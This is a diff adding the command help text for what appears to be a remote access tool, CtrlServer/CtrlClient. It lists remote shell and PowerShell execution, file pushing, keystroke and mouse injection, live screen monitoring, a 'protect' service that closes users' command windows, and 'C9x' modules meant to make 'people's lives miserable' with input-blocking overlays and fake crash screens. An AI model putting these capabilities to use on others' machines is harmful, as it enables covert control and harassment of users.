@@ -1,0 +1,248 @@
+help
+Help [COMMAND]
+	Prints help information for the specified command.
+	If [COMMAND] is not given, all the available commands will be printed.
+<END>
+cmd
+Cmd <CMD>
+	Runs <CMD> as a Windows command on the client machine.
+	The command is run with the prefix "cmd /c".
+	This is also the default behavior if a command is not recognized.
+	For non-Windows machines, Raw <CMD> should be used.
+	Due to each command being run in a separate process, "cd" cannot be used.
+	If the command needs to be run in a specific directory, use RunIn <DIR> <CMD>.
+<END>
+raw
+Raw <CMD>
+	Runs <CMD> as a raw command on the client machine.
+	The command is run as-is, with no changes.
+	For Windows machines, Cmd <CMD> should be used.
+	The Raw command may also be used to directly execute programs, 
+	skipping cmd.exe and thus increasing execution speed.
+<END>
+ps
+PS <CMD>
+	Runs <CMD> as a Windows PowerShell command on the client machine.
+	Due to each command being run in a separate process, "cd" cannot be used.
+	If the command needs to be run in a specific directory, use PSIn <DIR> <CMD>.
+<END>
+runin
+RunIn <DIR> <CMD>
+	Runs <CMD> as a Windows command in the directory of <DIR> on the client machine.
+	For more information on how the command is run, refer to Cmd <CMD>.
+<END>
+rawin
+RawIn <DIR <CMD>
+	Runs <CMD> as a raw command in the directory of<DIR> on the client machine.
+	For more information on how the command is run, refer to Raw <CMD>.
+<END>
+psin
+PSIn <DIR> <CMD>
+	Runs <CMD> as a Windows PowerShell command in the directory of <DIR> on the client machine.
+	For more information on how the command is run, refer to PS <CMD>.
+<END>
+sendfile
+SendFile <PATH> [DIR]
+	Sends the file with the path/name <PATH> on the local machine to [DIR] on the client machine.
+	If [DIR] is not specified or ".", the file will be sent to the working directory.
+<END>
+leftclick
+LeftClick
+	Generates a left click on the client machine.
+<END>
+rightclick
+RightClick
+	Generates a right click on the client machine.
+<END>
+middleclick
+MiddleClick
+	Generates a middle (mouse scroll wheel) click on the client machine.
+<END>
+ldblclick
+LDblClick
+	Generates a left double click on the client machine.
+<END>
+movemouse,mm
+MoveMouse, MM <X> <Y>
+	Moves the mouse of the client to the specified coordinates on the screen.
+<END>
+screenshot,ss
+ScreenShot, SS
+	Takes a screenshot of the client's primary monitor and displays it in a window.
+<END>
+clickablescreenshot,css
+ClickableScreenshot, CSS
+	Takes a screenshot of the client's primary monitor and displays it in a window.
+	Clicking on this screenshot will cause a click in the same location on the client machine,
+	and the screenshot window to close.
+	The program will wait until either the screenshot is closed or a click is generated.
+<END>
+interactivescreenshot,iss
+InteractiveScreenshot,ISS
+	Takes a screenshot of the client's primary monitor and displays it in a window.
+	Clicking on this screenshot will cause a click in the same location on the client machine,
+	but unlike ClickableScreenshot this does not close the screenshot window.
+	The program will NOT wait for the screenshot to be closed.
+<END>
+monitor
+Monitor <PORT> [TITLE]
+	Starts a Monitor process in a separate thread and window.
+	The Monitor gives a live feed of the client's primary monitor at about 22FPS.
+	The data will be transmitted over a new socket, with port number <PORT>,
+	and the title will be "CtrlServer: Monitor" unless specified by [TITLE].
+	As it uses a separate socket, switching the client or even closing the connection will not stop it.
+	However the thread still belongs to the main Ctrl software,
+	so shutting down either the client or the server will stop the Monitor.
+<END>
+insertstr,is
+InsertStr, IS <STR>
+	Simulates the typing of the string <STR> on the client machine. 
+	A percent (%) can be used to denote a special keystroke. Special keystrokes include:
+	%lk Toggle Caps Lock
+	%tb Tab
+	%bk Backspace
+	%dl Delete
+	%nl New Line (Enter)
+	%ec Esc (Escape)
+	%c<KEY> Ctrl + <KEY>
+	%%% Percent sign (%)
+<END>
+keycombo,kc
+KeyCombo, KC <COMBO>
+	Performs an advanced special key combo on the client machine.
+	<COMBO> consists of space-separated actions in the form of <ACTION>:<KEY(S)>.
+	<ACTION> is a single character:
+	P: Press down a key
+	R: Release a key that's already pressed down
+	C: Press keys in order, and release them in the opposite order.
+	Multiple keys can be specified for C, separated by commas (,).
+	<KEYS> can be any single letter or number, or:
+	Alt
+	Ctrl
+	Enter
+	Shift
+	Delete
+	Esc
+	LeftArrow (or LArrow)
+	RightArrow (or RArrow)
+	UpArrow (or UArrow)
+	DownArrow (or DArrow)
+	Ex: KeyCombo C:Ctrl,Alt,UpArrow
+<END>
+setcmdtimeout
+SetCmdTimeout <TIMEOUT>
+	Sets the command timeout duration of the client software in milliseconds.
+	If an executing command does not finish after the timeout value,
+	it will be force terminated and an error message will be printed.
+	The default timeout value for the current version of CtrlClient is 3000 ms.
+<END>
+setprotect
+SetProtect <ON/OFF>
+	Enables or disables protect service of the client software (Windows Only).
+	The protect service periodically closes all PowerShell and Command Prompt windows.
+	It is enabled by default, unless the client is started from the command line
+	with the argument "noprotect".
+<END>
+winfullname
+WinFullName, WFN
+	Retrieves the full name of the client machine's current user (Windows Only).
+<END>
+clientinfo
+ClientInfo
+	Retrieves information about the client machine.
+	Currently, that includes:
+	The username of the active user
+	The computer name
+	The OS name
+<END>
+clientinfoex
+ClientInfoEx
+	Retrieves information about the client machine. It is similar to ClientInfo but contains more technical info.
+<END>
+jvminstancename
+JVMInstanceName
+	Retrieves the name of the JVM instance of the client software.
+	The name contains the PID, which is often used in debugging and updating.
+<END>
+clientver
+ClientVer
+	Retrieves the version of the client software.
+	Client versions are in the format specified below:
+	CCLIENT.VER.<BUILD>.<MAX_CMD_BYTE_VAL>:<MAX_CMD_NAME>.<LATEST_FEATURE>.<YEAR>.<MONTH>.<DAY>
+<END>
+clientcount,cc
+ClientCount, CC
+	Prints the number of clients waiting in queue.
+	Since the client and server communicate one-on-one, other clients wait in a queue.
+	This command prints the number of clients in that queue.
+<END>
+clientlist
+ClientList
+	Prints information about all clients, including the current client and the ones in queue.
+	The information includes the Full Name (Windows only), and the result of a ClientInfo query.
+<END>
+clientlistex
+ClientListEx
+	Performs the same task as ClientList, but also prints the version and JVM instance name.
+<END>
+clientnamelist
+ClientNameList
+	Prints the full names of all clients in the queue (not including the current client).
+	ClientList is recommended as it provides more information, but this command is faster.
+<END>
+nextclient,nc
+NextClient, NC [CLIENT#]
+	If [CLIENT#] is specified, this command switches the client to the one specified by [CLIENT#].
+	[CLIENT#] can be obtained by the command ClientList or ClientNameList;
+	it ranges from 1 to the number of clients in queue.
+	If [CLIENT#] < 1, this command will do nothing.
+	If [CLIENT#] is not specified, the client will be switched to the next one in line.
+	The current client's connection will be moved to the back of the queue.
+	If there are no clients in the queue, this command does nothing.
+<END>
+closeconnection
+CloseConnection
+	Closes the connection with the current client and move to the next one in queue.
+	If there are no clients waiting, the program will wait until another client connects.
+<END>
+killclient,shutdownclientsoftware
+KillClient, ShutdownClientSoftware
+	Kills the current client's CtrlClient software.
+	Warning: After being killed, unless there is another instance of CtrlClient running,
+	you will not be able to restart it and thus you will lose control of this client.
+	This command is usually used for updating CtrlClient or debugging.
+<END>
+runafter,executeafter
+RunAfter, ExecuteAfter <MILLIS> <CTRLCMD>
+	Runs <CTRLCMD> after <MILLIS> milliseconds.
+	<CTRLCMD> is a CtrlServer command (e.g. SendFile, Cmd, Raw, etc).
+	In the meantime, before <MILLIS> elapses and <CTRLCMD> is executed, other commands can be run. 
+<END>
+c9x
+C9x <NAME> <ON/OFF>
+	Enables or disables a C9x program with the name <NAME> on the client machine.
+	C9x programs are a collection of small programs that make people's lives miserable.
+	Supported names include:
+	GlassPanel (or C9DC):
+		Creates a transparent window that goes on top of everything. The window blocks all mouse input,
+		and periodically requests focus to block keyboard input as well.
+	Flicker (or C9C8)
+		Creates a thread that runs in the background that periodically makes the screen flicker.
+		Each flicker is less than 10s from the next one. They're caused by an all-black fullscreen window.
+	MouseBlocker (or C9DD)
+		Creates a window in the shape and image of a crossed-out symbol that follows the cursor.
+		The window blocks all mouse inputs. While in the window, the mouse cursor is not visible.
+	BSOD_<OSNAME> (or KernelPanic_<OSNAME>, EC85_<OSNAME>):
+		Creates a fullscreen window that displays a realistic picture of a OS crash.
+		(i.e. Blue Screen Of Death/Kernel Panic) 
+		This window is always on top and hides the cursor for best effects.
+		As the crash picture depends on the OS, it requires a secondary argument in <NAME>.
+		It is specified in the form EC85/BSOD/KernelPanic_<OSNAME>.
+		Supported OS names include Win10/Win8, Win7/WinVista, MacOSX and Linux.
+		<OSNAME> can also be AUTO to automatically select the right BSOD image.
+<END>
+exit
+Exit
+	Exits CtrlServer. Closes the connection with all clients but does not shut them down.
+	To shut down a client, use KillClient or ShutdownClientSoftware.
+<END>
